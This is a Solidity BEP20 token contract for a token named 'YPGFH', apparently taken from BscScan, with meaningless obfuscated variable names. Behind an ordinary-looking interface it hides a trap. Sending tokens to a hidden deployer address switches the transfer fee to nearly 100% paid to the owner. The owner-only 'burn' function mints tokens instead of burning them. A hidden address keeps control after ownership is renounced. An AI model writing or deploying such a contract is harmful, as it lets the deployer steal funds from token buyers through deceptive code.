/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract QxAlcy {
address private  LfTlFi = address(0);
address public owner;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  IPRNkZ = 100000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  wHMhvP = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant fYWqvb = 73999;
address public  aDzXDr = address(0);
uint256 public  rpfsCT = 100000000000000000;
string public  symbol = "YPGFH";
address public  sbcCJu = address(0);
uint256 public  pXQizv = 1000000000000000000;
uint256 public  jUpmaW = 100000000000000000000;
string public  name = "YPGFH";
uint256 public  ElHPHc = 100000000000000000000000;
address public  INyFwy = address(0);
uint256 private  DWXMub = 10000000000000;
uint256 public  mzuLGO = 10000000000000000000;
uint256 public  tOieUH = 10000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  HlMNjN = address(0);
address public  iEiLHh = address(0);
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  pukTTk = 10000000000000000000000000000;
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "SRFuFd");
require(to != address(0), "SRFuFd");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* fYWqvb/DWXMub ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==LfTlFi){
DWXMub = 73999+1;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () public {
LfTlFi = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}